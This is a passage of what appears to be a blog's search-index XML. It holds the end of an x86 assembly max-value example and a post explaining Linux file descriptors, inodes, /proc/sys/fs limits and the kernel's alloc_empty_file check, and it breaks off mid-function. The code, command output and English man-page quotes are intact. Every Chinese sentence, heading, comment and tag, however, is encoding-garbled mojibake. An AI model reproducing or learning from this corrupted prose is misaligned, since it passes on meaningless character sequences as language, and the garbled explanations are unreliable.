start_loop<span class="hljs-comment">#å¦‚æœebxæ›´å¤§é‚£ä¹ˆç›´æ¥ä¸‹ä¸€æ¬¡å¾ªç¯</span><br>    movl %eax,%ebx<span class="hljs-comment">#å¦‚æœeaxæ›´å¤§é‚£ä¹ˆæŠŠeaxä¸­æ•°å­—æ”¾åˆ°ebxä¸­</span><br>    jmp start_loop<br><br>loop_exit:<br>    mov $1,%eax<br>    <span class="hljs-keyword">int</span> $0x8<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ul><li>data_itemsæ˜¯æ•°ç»„çš„é¦–åœ°å€</li><li>ediçš„å€¼æ˜¯æ•°ç»„çš„ä¸‹æ ‡</li><li>4è¡¨ç¤ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ å 4å­—èŠ‚,æ•°ç»„ä¸­ç¬¬ediä¸ªå…ƒç´ çš„åœ°å€æ˜¯<code>data_items + edi * 4</code></li><li>ebxå¯„å­˜å™¨ä¿å­˜åˆ°ç›®å‰ä¸ºæ­¢æ‰¾åˆ°çš„æœ€å¤§å€¼</li><li>eaxå¯„å­˜å™¨ä¿å­˜å½“å‰è¦æ¯”è¾ƒçš„æ•°</li></ul>]]></content>
    
    
    <categories>
      
      <category>æ±‡ç¼–è¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxæ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»</title>
    <link href="/p/f1bb17a0/"/>
    <url>/p/f1bb17a0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h1><p>Linuxä¸­ï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼ˆFile descriptorï¼Œfdï¼‰ï¼Œæ˜¯è¡¨ç¤ºæŒ‡å‘æ–‡ä»¶çš„å¼•ç”¨çš„æŠ½è±¡åŒ–æ¦‚å¿µï¼Œåœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œå½“è¿›ç¨‹æ‰“å¼€ç°æœ‰æ–‡ä»¶æˆ–åˆ›å»ºæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦</p><p>ä¸‹é¢openç³»ç»Ÿè°ƒç”¨è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç»™fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fd = open(pathname, flags, mode)<br></code></pre></td></tr></table></figure><p>å¸¸è§çš„å‡ ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š</p><ul><li><p>STDINï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š0ï¼›æ ‡å‡†è¾“å…¥ï¼Œé»˜è®¤ä»é”®ç›˜è¯»å–ä¿¡æ¯ï¼›</p></li><li><p>STDOUTï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š1ï¼›æ ‡å‡†è¾“å‡ºï¼Œé»˜è®¤å°†è¾“å‡ºç»“æœè¾“å‡ºè‡³ç»ˆç«¯ï¼›</p></li><li><p>STDERRï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼š2ï¼›æ ‡å‡†é”™è¯¯ï¼Œé»˜è®¤å°†è¾“å‡ºç»“æœè¾“å‡ºè‡³ç»ˆç«¯</p></li></ul><h1 id="å‘æ ‡å‡†è¾“å‡ºä¸­å†™å…¥å­—ç¬¦ä¸²"><a href="#å‘æ ‡å‡†è¾“å‡ºä¸­å†™å…¥å­—ç¬¦ä¸²" class="headerlink" title="å‘æ ‡å‡†è¾“å‡ºä¸­å†™å…¥å­—ç¬¦ä¸²"></a>å‘æ ‡å‡†è¾“å‡ºä¸­å†™å…¥å­—ç¬¦ä¸²</h1><p>æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æè¿°ç¬¦ä¸º1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *msg = <span class="hljs-string">&quot;Hello, world!\n&quot;</span>;<br>    syscall(SYS_write, <span class="hljs-number">1</span>, msg, <span class="hljs-built_in">strlen</span>(msg));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">  ./a.out</span><br>Hello, world!<br></code></pre></td></tr></table></figure><h1 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h1><p>inodeæ˜¯ç”¨æ¥å­˜å‚¨æ–‡ä»¶<strong>å…ƒæ•°æ®</strong>çš„ï¼Œ<code>stat</code>å‘½ä»¤å¯ä»¥è¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å…ƒä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">stat C<br>  File: C<br>  Size: <span class="hljs-number">4096</span>            Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   directory<br>Device: <span class="hljs-number">801</span>h/<span class="hljs-number">2049</span>d      Inode: <span class="hljs-number">786444</span>      Links: <span class="hljs-number">2</span><br>Access: (<span class="hljs-number">0775</span>/drwxrwxr-x)  Uid: ( <span class="hljs-number">1000</span>/ zaralts)   Gid: ( <span class="hljs-number">1000</span>/ zaralts)<br>Access: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-09</span> <span class="hljs-number">16</span>:<span class="hljs-number">44</span>:<span class="hljs-number">06.279746438</span> +<span class="hljs-number">0800</span><br>Modify: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">11.594725534</span> +<span class="hljs-number">0800</span><br>Change: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">11.594725534</span> +<span class="hljs-number">0800</span><br> Birth: -<br></code></pre></td></tr></table></figure><p><code>df -i </code>å‘½ä»¤æŸ¥çœ‹æ¯ä¸ªç¡¬ç›˜åˆ†åŒºçš„inodeæ€»æ•°å’Œå·²ç»ä½¿ç”¨çš„æ•°é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> df -i<br>Filesystem      Inodes  IUsed   IFree IUse% Mounted on<br>udev            <span class="hljs-number">493942</span>    <span class="hljs-number">484</span>  <span class="hljs-number">493458</span>    <span class="hljs-number">1</span>% /dev<br>tmpfs           <span class="hljs-number">500214</span>   <span class="hljs-number">1088</span>  <span class="hljs-number">499126</span>    <span class="hljs-number">1</span>% /run<br>/dev/sda1      <span class="hljs-number">2621440</span> <span class="hljs-number">227759</span> <span class="hljs-number">2393681</span>    <span class="hljs-number">9</span>% /<br>tmpfs           <span class="hljs-number">500214</span>      <span class="hljs-number">1</span>  <span class="hljs-number">500213</span>    <span class="hljs-number">1</span>% /dev/shm<br>tmpfs           <span class="hljs-number">500214</span>      <span class="hljs-number">5</span>  <span class="hljs-number">500209</span>    <span class="hljs-number">1</span>% /run/lock<br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">18</span>  <span class="hljs-number">500196</span>    <span class="hljs-number">1</span>% /sys/fs/cgroup<br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">25</span>  <span class="hljs-number">500189</span>    <span class="hljs-number">1</span>% /run/user/<span class="hljs-number">121</span><br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">49</span>  <span class="hljs-number">500165</span>    <span class="hljs-number">1</span>% /run/user/<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><code>ll -i</code>å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•æ‰€æœ‰çš„åŒ…æ‹¬inodeå·çš„æ–‡ä»¶ä¿¡æ¯</p><p>inodeå·æ˜¯åœ¨ç¬¬ä¸€åˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">ll -i<br><span class="hljs-number">528761</span> drwxr-xr-x <span class="hljs-number">22</span> zaralts zaralts  <span class="hljs-number">4096</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">8</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span> ./<br><span class="hljs-number">524289</span> drwxr-xr-x  <span class="hljs-number">3</span> root    root     <span class="hljs-number">4096</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> ../<br><span class="hljs-number">524792</span> -rw-------  <span class="hljs-number">1</span> zaralts zaralts  <span class="hljs-number">5848</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">8</span> <span class="hljs-number">15</span>:<span class="hljs-number">36</span> .bash_history<br><span class="hljs-number">528764</span> -rw-r--r--  <span class="hljs-number">1</span> zaralts zaralts   <span class="hljs-number">220</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> .bash_logout<br><span class="hljs-number">528762</span> -rw-r--r--  <span class="hljs-number">1</span> zaralts zaralts  <span class="hljs-number">3771</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> .bashrc<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a7b17995b8c14f1bb7a11f7070713ab5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><ul><li>æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæœ‰æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œè¯¥è¡¨çš„æ¯ä¸€æ¡éƒ½è®°å½•äº†å•ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ç›¸å…³ä¿¡æ¯</li><li>å†…æ ¸å¯¹æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶ç»´æŠ¤æœ‰ä¸€ä¸ªç³»ç»Ÿçº§çš„æè¿°è¡¨æ ¼ï¼ˆopen file description tableï¼‰ï¼Œè¡¨ä¸­å„æ¡ç›®ç§°ä¸ºæ‰“å¼€æ–‡ä»¶å¥æŸ„ï¼ˆopen file handleï¼‰ï¼Œä¸€ä¸ªæ‰“å¼€æ–‡ä»¶å¥æŸ„å­˜å‚¨äº†ä¸ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶ç›¸å…³çš„å…¨éƒ¨ä¿¡æ¯ï¼Œæ¯”å¦‚å½“å‰æ–‡ä»¶åç§»é‡ã€å¯¹è¯¥æ–‡ä»¶ i-node å¯¹è±¡çš„å¼•ç”¨ç­‰</li></ul><h1 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/pid/fd"></a>/proc/pid/fd</h1><p>è¯¥æ–‡ä»¶å¤¹åŒ…å«äº†æŸä¸€è¿›ç¨‹æ‰€å ç”¨çš„æ–‡ä»¶æè¿°ç¬¦<br>ä¸‹å›¾ä¸­socketï¼šåé¢æ˜¾ç¤ºçš„æ˜¯å¯¹åº”çš„inodeå·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">/proc/<span class="hljs-number">92044</span>/fd$ ll<br>total <span class="hljs-number">0</span><br>dr-x------ <span class="hljs-number">2</span> zaralts zaralts  <span class="hljs-number">0</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> ./<br>dr-xr-xr-x <span class="hljs-number">9</span> zaralts zaralts  <span class="hljs-number">0</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span> ../<br>lr-x------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span class="hljs-number">0</span> -&gt; /dev/null<br>lrwx------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span class="hljs-number">1</span> -&gt; <span class="hljs-string">&#x27;socket:[39859]&#x27;</span><br>lrwx------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>æœˆ   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span class="hljs-number">10</span> -&gt; <span class="hljs-string">&#x27;socket:[477522]&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="proc-sys-fs-inode-state"><a href="#proc-sys-fs-inode-state" class="headerlink" title="/proc/sys/fs/inode-state"></a>/proc/sys/fs/inode-state</h1><ul><li>ç¬¬ä¸€åˆ—çš„å€¼ä¸ºå·²ç»åˆ†é…çš„inodeæ•°é‡ï¼ˆnr_inodesï¼‰</li><li>ç¬¬äºŒåˆ—çš„å€¼ä¸ºå‰©ä½™å¯åˆ†é…çš„inodeæ•°é‡ï¼ˆnr_free_inodesï¼‰</li><li>ç¬¬ä¸‰åˆ—å½“nr_inodes &gt; inode-maxæ—¶ä¸ºé 0ï¼ˆpreshrinkï¼‰</li><li>åé¢ä¸‰ä¸ªä¸ºdummy valuesï¼ˆæ€»æ˜¯ä¸º0ï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat /proc/sys/fs/inode-state                             <br><span class="hljs-number">139193</span>  <span class="hljs-number">25844</span>   <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="linuxæ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»"><a href="#linuxæ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»" class="headerlink" title="linuxæ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»"></a>linuxæ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»</h1><h2 id="ä¸€åˆ‡çš†æ–‡ä»¶"><a href="#ä¸€åˆ‡çš†æ–‡ä»¶" class="headerlink" title="ä¸€åˆ‡çš†æ–‡ä»¶"></a>ä¸€åˆ‡çš†æ–‡ä»¶</h2><p>åœ¨ Linux ä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ã€‚è®¸å¤šæ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶æ‰“å¼€ã€è¿›ç¨‹åˆ›å»ºã€ç®¡é“åˆ›å»ºã€æ–°çš„ç½‘ç»œè¿æ¥åˆ›å»ºï¼Œç”šè‡³è®¡æ—¶å™¨åˆ›å»º(timerfd _ create)å’Œäº‹ä»¶ç”Ÿæˆ(eventfd) ï¼Œéƒ½ä¼šå¢åŠ  nr_files </p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/124063198?spm=1001.2014.3001.5501">æ–‡ä»¶æè¿°ç¬¦ä¸inodeçš„å…³ç³»</a></p><h2 id="file-max"><a href="#file-max" class="headerlink" title="file-max"></a>file-max</h2><p>file-maxå®šä¹‰äº†ç³»ç»Ÿçº§åˆ«çš„ã€æ‰€æœ‰è¿›ç¨‹çš„æ‰“å¼€æ–‡ä»¶é™åˆ¶</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">This <span class="hljs-keyword">file</span> defines <span class="hljs-keyword">a</span> <span class="hljs-built_in">system</span>-wide limit <span class="hljs-keyword">on</span> the <span class="hljs-keyword">number</span> of<br>              <span class="hljs-keyword">open</span> <span class="hljs-keyword">files</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> processes.  System calls that fail when<br>              encountering this limit fail with the error ENFILE.  (See<br>              also setrlimit(<span class="hljs-number">2</span>), which can <span class="hljs-keyword">be</span> used by <span class="hljs-keyword">a</span> process <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span><br>              the per-process limit, RLIMIT_NOFILE, <span class="hljs-keyword">on</span> the <span class="hljs-keyword">number</span> of<br>              <span class="hljs-keyword">files</span> it may <span class="hljs-keyword">open</span>.)  If you <span class="hljs-built_in">get</span> lots of error <span class="hljs-keyword">messages</span> in<br>              the kernel <span class="hljs-built_in">log</span> about running out of <span class="hljs-keyword">file</span> handles (<span class="hljs-keyword">open</span><br>              <span class="hljs-keyword">file</span> descriptions) (look <span class="hljs-keyword">for</span> <span class="hljs-comment">&quot;VFS: file-max limit &lt;number&gt;</span><br>              reached<span class="hljs-comment">&quot;), try increasing this value:</span><br><br>                  <span class="hljs-keyword">echo</span> <span class="hljs-number">100000</span> &gt; /proc/sys/fs/<span class="hljs-keyword">file</span>-<span class="hljs-built_in">max</span><br><br>              Privileged processes (CAP_SYS_ADMIN) can override the<br>              <span class="hljs-keyword">file</span>-<span class="hljs-built_in">max</span> limit.<br>          <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›®å‰çš„file-maxé™åˆ¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/file-max</span><br>394568<br></code></pre></td></tr></table></figure><h2 id="file-nr"><a href="#file-nr" class="headerlink" title="file-nr"></a>file-nr</h2><p>/proc/sys/fs/file-nræ˜¯ä¸ªåªè¯»æ–‡ä»¶ï¼Œä¸‰ä¸ªè¾“å‡ºåˆ†åˆ«è¡¨ç¤ºå·²ç»åˆ†é…çš„æ–‡ä»¶æè¿°ç¬¦æ•°ã€å·²ç»åˆ†é…ä½†æœªä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦æ•°ã€æ–‡ä»¶æè¿°ç¬¦æ•°æœ€å¤§å€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/file-nr</span><br>11616   0       394568<br></code></pre></td></tr></table></figure><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/<span class="hljs-keyword">proc</span>/sys/fs/file-nr<span class="hljs-title"></span><br><span class="hljs-title">              This</span> (read-only)<span class="hljs-title"> file</span> contains<span class="hljs-title"> three</span> numbers:<span class="hljs-title"> the</span> number<span class="hljs-title"></span><br><span class="hljs-title">              of</span> allocated<span class="hljs-title"> file</span> handles (i.e.,<span class="hljs-title"> the</span> number<span class="hljs-title"> of</span> open<span class="hljs-title"> file</span><br><span class="hljs-title">              descriptions;</span> see<span class="hljs-title"> open(2));</span> the<span class="hljs-title"> number</span> of<span class="hljs-title"> free</span> file<span class="hljs-title"></span><br><span class="hljs-title">              handles;</span> and<span class="hljs-title"> the</span> maximum<span class="hljs-title"> number</span> of<span class="hljs-title"> file</span> handles (i.e.,<span class="hljs-title"> the</span><br><span class="hljs-title">              same</span> value<span class="hljs-title"> as</span> /<span class="hljs-keyword">proc</span>/sys/fs/file-max).<span class="hljs-title">  If</span> the<span class="hljs-title"> number</span> of<span class="hljs-title"></span><br><span class="hljs-title">              allocated</span> file<span class="hljs-title"> handles</span> is<span class="hljs-title"> close</span> to<span class="hljs-title"> the</span> maximum,<span class="hljs-title"> you</span> should<span class="hljs-title"></span><br><span class="hljs-title">              consider</span> increasing<span class="hljs-title"> the</span> maximum.<span class="hljs-title">  Before</span> Linux 2.6,<span class="hljs-title"> the</span><br><span class="hljs-title">              kernel</span> allocated<span class="hljs-title"> file</span> handles<span class="hljs-title"> dynamically,</span> but<span class="hljs-title"> it</span> didn&#x27;t<span class="hljs-title"></span><br><span class="hljs-title">              free</span> them<span class="hljs-title"> again.</span> <span class="hljs-title"> Instead</span> the<span class="hljs-title"> free</span> file<span class="hljs-title"> handles</span> were<span class="hljs-title"> kept</span><br><span class="hljs-title">              in</span> a<span class="hljs-title"> list</span> for<span class="hljs-title"> reallocation;</span> the &quot;free<span class="hljs-title"> file</span> handles&quot;<span class="hljs-title"> value</span><br><span class="hljs-title">              indicates</span> the<span class="hljs-title"> size</span> of<span class="hljs-title"> that</span> list.<span class="hljs-title">  A</span> large<span class="hljs-title"> number</span> of<span class="hljs-title"> free</span><br><span class="hljs-title">              file</span> handles<span class="hljs-title"> indicates</span> that<span class="hljs-title"> there</span> was<span class="hljs-title"> a</span> past<span class="hljs-title"> peak</span> in<span class="hljs-title"> the</span><br><span class="hljs-title">              usage</span> of<span class="hljs-title"> open</span> file<span class="hljs-title"> handles.</span> <span class="hljs-title"> Since</span> Linux 2.6,<span class="hljs-title"> the</span> kernel<span class="hljs-title"></span><br><span class="hljs-title">              does</span> deallocate<span class="hljs-title"> freed</span> file<span class="hljs-title"> handles,</span> and<span class="hljs-title"> the</span> &quot;free<span class="hljs-title"> file</span><br><span class="hljs-title">              handles&quot;</span> value<span class="hljs-title"> is</span> always<span class="hljs-title"> zero.</span><br></code></pre></td></tr></table></figure><h2 id="nr-open"><a href="#nr-open" class="headerlink" title="nr_open"></a>nr_open</h2><p>å•ä¸ªè¿›ç¨‹æ‰“å¼€æ–‡ä»¶æ•°çš„æœ€å¤§å€¼</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/<span class="hljs-keyword">proc</span>/sys/fs/nr_open (since<span class="hljs-title"> Linux</span> 2.6.25)<span class="hljs-title"></span><br><span class="hljs-title">              This</span> file<span class="hljs-title"> imposes</span> a<span class="hljs-title"> ceiling</span> on<span class="hljs-title"> the</span> value<span class="hljs-title"> to</span> which<span class="hljs-title"> the</span><br><span class="hljs-title">              RLIMIT_NOFILE</span> resource<span class="hljs-title"> limit</span> can<span class="hljs-title"> be</span> raised (see<span class="hljs-title"></span><br><span class="hljs-title">              getrlimit(2)).</span> <span class="hljs-title"> This</span> ceiling<span class="hljs-title"> is</span> enforced<span class="hljs-title"> for</span> both<span class="hljs-title"></span><br><span class="hljs-title">              unprivileged</span> and<span class="hljs-title"> privileged</span> process.<span class="hljs-title">  The</span> default<span class="hljs-title"> value</span> in<span class="hljs-title"></span><br><span class="hljs-title">              this</span> file<span class="hljs-title"> is</span> 1048576.  (Before<span class="hljs-title"> Linux</span> 2.6.25,<span class="hljs-title"> the</span> ceiling<span class="hljs-title"></span><br><span class="hljs-title">              for</span> RLIMIT_NOFILE<span class="hljs-title"> was</span> hard-coded<span class="hljs-title"> to</span> the<span class="hljs-title"> same</span> value.)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/nr_open</span><br>1048576<br></code></pre></td></tr></table></figure><h2 id="å‡½æ•°è°ƒç”¨é“¾åˆ†æ"><a href="#å‡½æ•°è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="å‡½æ•°è°ƒç”¨é“¾åˆ†æ"></a>å‡½æ•°è°ƒç”¨é“¾åˆ†æ</h2><ul><li>get_nr_fileså‡½æ•°è¿”å›å½“å‰çš„nr_fileså€¼</li><li>alloc_empty_fileåœ¨åˆ†é…fileç»“æ„ä½“ä¹‹å‰ï¼Œä¼šè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­å½“å‰nr_fileå€¼æ˜¯å¦å¤§äºæœ€å¤§å€¼files_stat.max_files</li><li>å¦‚æœå·²ç»è¶…è¿‡äº†æœ€å¤§å€¼ï¼Œé‚£ä¹ˆä¼šè¾“å‡ºï¼š<code>&quot;VFS: file-max limit %lu reached\n&quot;</code><br><img src="https://img-blog.csdnimg.cn/d113ec93770a4fd2841e865115e7cc8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><h2 id="get-nr-fileså‡½æ•°"><a href="#get-nr-fileså‡½æ•°" class="headerlink" title="get_nr_fileså‡½æ•°"></a>get_nr_fileså‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">get_nr_files</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">return</span> percpu_counter_read_positive(&amp;nr_files);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="alloc-empty-fileå‡½æ•°"><a href="#alloc-empty-fileå‡½æ•°" class="headerlink" title="alloc_empty_fileå‡½æ•°"></a>alloc_empty_fileå‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct file *<span class="hljs-title">alloc_empty_file</span><span class="hljs-params">(<span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">const</span> struct cred *cred)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> old_max;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br>    <span class="hljs-comment">/* Privileged users can go above max_files</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (get_nr_files() &gt;= files_stat.max_files &amp;&amp; !capable(CAP_SYS_ADMIN)) &#123;<br>        <span class="hljs-comment">/* percpu_counters are inaccurate.  Do an expensive check before we go and fail. */</span><br>        <span class="hljs-keyword">if</span> 